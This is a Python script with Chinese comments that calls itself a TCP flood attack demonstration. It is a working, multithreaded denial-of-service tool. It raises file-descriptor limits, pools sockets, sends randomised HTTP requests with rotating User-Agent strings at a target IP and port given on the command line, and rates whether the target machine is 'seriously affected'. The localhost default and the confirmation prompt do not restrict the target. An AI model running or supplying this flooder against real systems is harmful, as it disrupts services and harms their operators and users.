# -*- coding:UTF-8 -*-
# TCP Flood攻击演示脚本 - EMFILE优化版
# 自动处理"Too many open files"错误

import sys
import os
import time
import socket
import random
import threading
import argparse
import errno
import resource
from queue import Queue, Empty

class EMFILeSafeTCPFlood:
    def __init__(self):
        self.total_sent = 0
        self.total_failed = 0
        self.running = False
        self.lock = threading.Lock()
        self.connection_pool = Queue()
        self.max_pool_size = 100  # 连接池大小
        
    def setup_system(self):
        """检查和设置系统限制"""
        try:
            # 获取当前限制
            soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
            print(f"当前文件描述符限制: 软={soft_limit}, 硬={hard_limit}")
            
            # 尝试提高限制
            target_limit = min(65535, hard_limit)
            if target_limit > soft_limit:
                resource.setrlimit(resource.RLIMIT_NOFILE, (target_limit, hard_limit))
                print(f"已提高限制到: {target_limit}")
            
            return target_limit
        except Exception as e:
            print(f"无法提高系统限制: {e}")
            print("请以root权限运行或手动调整:")
            print("  ulimit -n 65535")
            print("  或编辑 /etc/security/limits.conf")
            return 1024  # 默认值
    
    def create_socket_with_retry(self, max_retries=5):
        """带重试机制的socket创建"""
        for attempt in range(max_retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(3)
                return sock
            except OSError as e:
                if e.errno == errno.EMFILE:
                    print(f"[重试 {attempt+1}/{max_retries}] 文件描述符不足，等待...")
                    time.sleep(0.5 * (attempt + 1))
                    # 尝试清理一些资源
                    self.cleanup_old_connections()
                else:
                    raise
        raise OSError(f"无法创建socket，重试{max_retries}次后失败")
    
    def cleanup_old_connections(self):
        """清理旧的连接资源"""
        try:
            # 清理Python的垃圾收集
            import gc
            gc.collect()
        except:
            pass
    
    def connection_worker(self):
        """连接池工作线程 - 管理可重用的连接"""
        while self.running:
            try:
                # 保持连接池中有一定数量的socket
                if self.connection_pool.qsize() < self.max_pool_size:
                    try:
                        sock = self.create_socket_with_retry()
                        self.connection_pool.put(sock, timeout=1)
                    except OSError as e:
                        if e.errno == errno.EMFILE:
                            time.sleep(0.5)
                        else:
                            time.sleep(0.1)
                else:
                    time.sleep(0.1)
            except Exception:
                time.sleep(0.1)
    
    def get_connection(self):
        """从连接池获取socket"""
        try:
            sock = self.connection_pool.get(timeout=2)
            return sock
        except Empty:
            # 池为空，创建新的
            return self.create_socket_with_retry()
    
    def return_connection(self, sock):
        """将socket返回到连接池"""
        if sock and not sock._closed:
            try:
                sock.settimeout(0.1)
            except:
                pass
            
            if self.connection_pool.qsize() < self.max_pool_size:
                self.connection_pool.put(sock)
            else:
                try:
                    sock.close()
                except:
                    pass
    
    def attack_worker(self, target_ip, target_port, worker_id):
        """攻击工作线程 - 使用连接池"""
        requests_sent = 0
        
        while self.running:
            sock = None
            try:
                # 从池中获取socket
                sock = self.get_connection()
                
                # 连接目标
                start_time = time.time()
                sock.connect((target_ip, target_port))
                connect_time = time.time() - start_time
                
                # 发送请求
                request = self.create_http_request(target_ip, worker_id, requests_sent)
                sock.send(request)
                requests_sent += 1
                
                # 更新统计
                with self.lock:
                    self.total_sent += 1
                
                # 显示进度
                if requests_sent % 100 == 0:
                    print(f"[Worker {worker_id:03d}] 发送 {requests_sent} 请求 | 连接时间: {connect_time:.3f}s")
                
                # 返回到连接池
                self.return_connection(sock)
                sock = None
                
                # 延迟
                time.sleep(random.uniform(0.001, 0.01))
                
            except socket.timeout:
                self.handle_error(worker_id, "连接超时", sock)
            except ConnectionRefusedError:
                self.handle_error(worker_id, "连接被拒绝", sock)
            except ConnectionResetError:
                self.handle_error(worker_id, "连接被重置", sock)
            except OSError as e:
                if e.errno == errno.EMFILE:
                    self.handle_error(worker_id, "文件描述符不足(EMFILE)", sock)
                    time.sleep(1)  # 严重错误，等待更久
                elif e.errno == errno.ENOBUFS or e.errno == errno.ENOMEM:
                    self.handle_error(worker_id, "系统缓冲区不足", sock)
                    time.sleep(0.5)
                else:
                    self.handle_error(worker_id, f"系统错误({e.errno})", sock)
            except Exception as e:
                self.handle_error(worker_id, f"未知错误: {e}", sock)
    
    def handle_error(self, worker_id, message, sock=None):
        """错误处理"""
        if sock:
            try:
                sock.close()
            except:
                pass
        
        with self.lock:
            self.total_failed += 1
        
        # 减少错误输出频率
        if random.random() < 0.01:  # 1%的概率输出错误
            print(f"[Worker {worker_id:03d}] {message}")
    
    def create_http_request(self, target_ip, worker_id, request_id):
        """创建HTTP请求"""
        user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]
        
        methods = ["GET", "HEAD", "POST"]
        paths = ["/", "/index.html", "/api/v1/test", "/static/main.js"]
        
        method = random.choice(methods)
        path = random.choice(paths)
        
        request_id_str = f"{worker_id:03d}-{request_id:06d}"
        
        if method == "POST":
            request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 32\r\n"
                f"Connection: close\r\n"
                f"X-Request-ID: {request_id_str}\r\n"
                f"\r\n"
                f"data=test&id={request_id_str}&time={int(time.time())}"
            )
        else:
            request = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Accept: text/html,application/xhtml+xml\r\n"
                f"Connection: close\r\n"
                f"X-Request-ID: {request_id_str}\r\n"
                f"\r\n"
            )
        
        return request.encode('utf-8')
    
    def start_attack(self, target_ip, target_port, num_workers, duration):
        """启动攻击"""
        print("=" * 70)
        print("TCP Flood攻击 - EMFILE优化版")
        print("=" * 70)
        print(f"目标: {target_ip}:{target_port}")
        print(f"工作线程: {num_workers}")
        print(f"持续时间: {duration}秒")
        print(f"连接池大小: {self.max_pool_size}")
        print("-" * 70)
        
        # 设置系统限制
        file_limit = self.setup_system()
        print(f"可用文件描述符: {file_limit}")
        print(f"建议最大线程数: {file_limit // 10} (文件描述符/10)")
        
        if num_workers > file_limit // 10:
            print(f"警告: 线程数 {num_workers} 可能超过系统限制")
            adjust = input("是否自动调整线程数? (y/N): ").lower()
            if adjust == 'y':
                num_workers = max(10, file_limit // 10)
                print(f"已调整线程数为: {num_workers}")
        
        confirm = input("\n开始攻击? (y/N): ").lower()
        if confirm != 'y':
            print("攻击取消")
            return
        
        print("\n[INFO] 启动攻击...")
        print("[INFO] 按 Ctrl+C 停止")
        print("-" * 70)
        
        self.running = True
        self.total_sent = 0
        self.total_failed = 0
        
        # 启动连接池工作线程
        pool_thread = threading.Thread(target=self.connection_worker, daemon=True)
        pool_thread.start()
        
        # 启动攻击工作线程
        workers = []
        for i in range(num_workers):
            worker = threading.Thread(
                target=self.attack_worker,
                args=(target_ip, target_port, i+1),
                daemon=True
            )
            workers.append(worker)
            worker.start()
        
        # 监控和统计
        start_time = time.time()
        last_count = 0
        last_time = start_time
        
        try:
            while time.time() - start_time < duration:
                time.sleep(1)
                
                current_time = time.time()
                elapsed = current_time - start_time
                
                # 计算速率
                current_count = self.total_sent
                interval = current_time - last_time
                rate = (current_count - last_count) / interval if interval > 0 else 0
                
                # 成功率
                total_attempts = self.total_sent + self.total_failed
                success_rate = (self.total_sent / total_attempts * 100) if total_attempts > 0 else 0
                
                # 显示状态
                print(f"\r[状态] 运行: {elapsed:.1f}s | "
                      f"成功: {self.total_sent:,} | "
                      f"失败: {self.total_failed:,} | "
                      f"速率: {rate:.1f}/s | "
                      f"成功率: {success_rate:.1f}% | "
                      f"连接池: {self.connection_pool.qsize()}", end="")
                
                last_count = current_count
                last_time = current_time
                
        except KeyboardInterrupt:
            print("\n\n[INFO] 用户中断")
        finally:
            self.running = False
            
            # 等待工作线程结束
            print("\n[INFO] 停止工作线程...")
            for worker in workers:
                worker.join(timeout=2)
            
            # 清理连接池
            while not self.connection_pool.empty():
                try:
                    sock = self.connection_pool.get_nowait()
                    sock.close()
                except:
                    pass
            
            pool_thread.join(timeout=1)
        
        # 最终统计
        elapsed = time.time() - start_time
        total_attempts = self.total_sent + self.total_failed
        success_rate = (self.total_sent / total_attempts * 100) if total_attempts > 0 else 0
        
        print(f"\n\n{'='*70}")
        print("攻击完成!")
        print(f"总运行时间: {elapsed:.2f}秒")
        print(f"成功请求: {self.total_sent:,}")
        print(f"失败请求: {self.total_failed:,}")
        print(f"成功率: {success_rate:.1f}%")
        print(f"平均速率: {self.total_sent/elapsed:.1f} 请求/秒")
        
        # 效果评估
        avg_rate = self.total_sent / elapsed if elapsed > 0 else 0
        print(f"\n效果评估:")
        if avg_rate > 1000:
            print("✓ 高强度攻击")
            print("  靶机可能已受到严重影响")
        elif avg_rate > 100:
            print("✓ 中等强度攻击")
            print("  靶机可能变慢")
        else:
            print("⚠ 低强度攻击")
            print("  可能需要调整参数")
        
        print(f"\n{'='*70}")

def main():
    parser = argparse.ArgumentParser(description="TCP Flood攻击 - EMFILE优化版")
    parser.add_argument('--target', default='127.0.0.1', help='目标IP')
    parser.add_argument('--port', type=int, default=8080, help='目标端口')
    parser.add_argument('--workers', type=int, default=100, help='工作线程数')
    parser.add_argument('--duration', type=int, default=30, help='持续时间(秒)')
    
    args = parser.parse_args()
    
    tester = EMFILeSafeTCPFlood()
    tester.start_attack(args.target, args.port, args.workers, args.duration)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n程序被中断")
    except Exception as e:
        print(f"错误: {e}")
        import traceback
        traceback.print_exc()